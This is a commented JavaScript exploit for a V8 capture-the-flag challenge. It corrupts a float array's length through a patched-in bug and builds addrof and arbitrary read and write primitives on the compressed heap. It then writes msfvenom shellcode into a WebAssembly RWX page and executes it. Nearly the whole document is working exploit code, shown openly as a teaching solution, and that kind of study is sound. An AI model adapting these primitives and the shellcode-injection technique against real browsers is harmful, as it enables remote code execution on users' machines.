/* This challenge is meant to be extremely hard. The way this exploit goes is
 * essentially as follows:
 *
 * Step 1: Read the patch.diff file to figure out the vulnerability
 *
 * Step 2: Use the vulnerability to get a corrupted float array. You can use
 *         this array to overwrite its own length to a very large number
 *
 * Step 3: Once you've done this, exploitation becomes (relatively) easy. There
 *         are loads of blog posts and other V8 exploits that you can use as
 *         a starting point. I'll list some below. The only issue will be that
 *         V8 somewhat recently started shipping with pointer compression, and
 *         most blog posts / exploits will be made for challenges / vulns from
 *         V8 versions without pointer compression.
 *
 * https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/
 * https://blog.exodusintel.com/2019/09/09/patch-gapping-chrome/
 * https://tcode2k16.github.io/blog/posts/2020-03-15-confidence-ctf/#chromatic-aberration
 * https://blog.hexrabbit.io/2020/03/16/chromatic-aberration-writeup/ (use google translate)
 * https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/ (very old)
 *
 * If you still have questions regarding this challenge, feel free to DM me 
 * anywhere. I'll do my best to respond to queries!
 *
 * Discord: Faith#2563
 * Twitter: @farazsth98
 */

// Helper functions setup to convert between doubles and numbers when needed
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u32_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) == float
    f64_buf[0] = val;
    return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) == BigInt
    u32_buf[0] = Number(val & 0xffffffffn);
    u32_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function hex(val) { // typeof(val) == BigInt
    return "0x" + val.toString(16);
}

// We set up a web assembly page. This is mapped as an RWX page that we will
// later write shellcode into.
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

console.log("[+] WebAssembly RWX page setup!");

// Next, set up three arrays. These will be allocated one after another because
// of the deterministic nature of the V8 heap. We corrupt the float array.
// You can find their offsets relative to each other using GDB.
//
// While we do this, we also trigger the vulnerability to get a corrupted
// float array in `float_arr`
var float_arr = [1.1];
float_arr = float_arr.slice(0); // Trigger the vuln
var addrof_arr = [{}, {}]; // Used for the addrof primitive later
var arb_read_arr = [1.1]; // Used for the arbitrary read primitive later

// We set up an ArrayBuffer and a DataView. We will use these later to write 
// our shellcode into the RWX page.
var buf = new ArrayBuffer(0x100);
var dataview = new DataView(buf);

console.log("[+] Corrupting float_arr's length to 2048");

// We need to store the current `elements` ptr before we corrupt the length
// because corrupting the length also requires us to corrupt the `elements` ptr
// in the process
var float_arr_elem = ftoi(float_arr[2]) & 0xffffffffn;

// Corrupt the length and keep the `elements` ptr intact
float_arr[2] = itof((0x1000n << 32n) + float_arr_elem);

if (float_arr.length === 2048) {
  console.log("[+] Corruption successful!");
} else {
  console.log("[!] Corruption failed. Try again.");
  throw error;
}

// Setup addrof primitive
// Bottom 32 bits of float_arr[4] corresponds to addrof_arr[0]
// We simply set addrof_arr[0] to the object whose address we want to leak
// Then we read from float_arr[4]
function addrof(obj) {
    addrof_arr[0] = obj;
    return ftoi(float_arr[4]) & 0xffffffffn;
}

console.log("[+] Addrof primitive has been setup");

// Setup an arbitrary read primitive for the V8 compressed heap
// We do this by overwriting the elements pointer of our arb_read_arr to a
// chosen address - 8 (making sure to keep the length set to 0x1000). We
// subtract 8 because for any float array, arr[0] == (*elements_ptr + 8).
// The elements pointer of arb_read_arr is at float_arr[17], offset found
// through GDB.
// addr must be a 32-bit value here
function compressed_arb_read(addr) {
    float_arr[17] = itof((0x1000n << 32n) + addr - 8n);
    return ftoi(arb_read_arr[0]);
}

console.log("[+] Arbitrary read primitive for the compressed heap has been setup");

// Setup a function that writes our shellcode to a given address
// We do this by overwriting the backing store address of the ArrayBuffer we
// previously allocated to our chosen address. We then use the DataView that we
// also allocated to write our shellcode to that address space.
//
// Using GDB, we find that the backing store address of our ArrayBuffer is
// misaligned at float_arr[20] and float_arr[21]. The misalignment is as
// follows:
//
// * The upper 32-bits of float_arr[20] correspond to the lower 32 bits of
//   the backing store address
// * The lower 32-bits of float_arr[21] correspond to the upper 32 bits of
//   the backing store address
//
// If this is confusing to you, that's because it is very confusing :p I would
// suggest looking at this in GDB and comparing whatever I mentioned above to
// what you see in GDB until it makes sense
//
// addr must be a 64-bit value here
function copy_shellcode(addr, shellcode) {
    // The backing store address of buf is not aligned to 64 bytes, so we have
    // to write the upper 32-bits and the lower 32-bits of our address to two
    // separate indices like this
    float_arr[20] = itof((addr & 0xffffffffn) << 32n);
    float_arr[21] = itof((addr & 0xffffffff00000000n) >> 32n);

    for (let i = 0; i < shellcode.length; i++) {
        dataview.setUint32(4*i, shellcode[i], true);
    }
}

// msfvenom -p linux/x64/exec CMD='./flagprinter' --format dword
var shellcode = [0x99583b6a, 0x622fbb48, 0x732f6e69, 0x48530068, 0x2d68e789, 0x48000063, 0xe852e689, 0x0000000e, 
0x6c662f2e, 0x72706761, 0x65746e69, 0x57560072, 0x0fe68948, 0x00000005];

// Now, we leak the address of our RWX page
// Using GDB, we know this address is at *(&wasm_instance + 0x68)
var rwx_page_addr = compressed_arb_read(addrof(wasm_instance) + 0x68n);

console.log("[+] RWX page address found: " + hex(rwx_page_addr));

// Finally, we copy our shellcode to the RWX page and call the WASM function to
// execute it.
console.log("[+] Copying ./flagprinter shellcode to RWX page");
copy_shellcode(rwx_page_addr, shellcode);

console.log("[+] Printing flag!");
f();
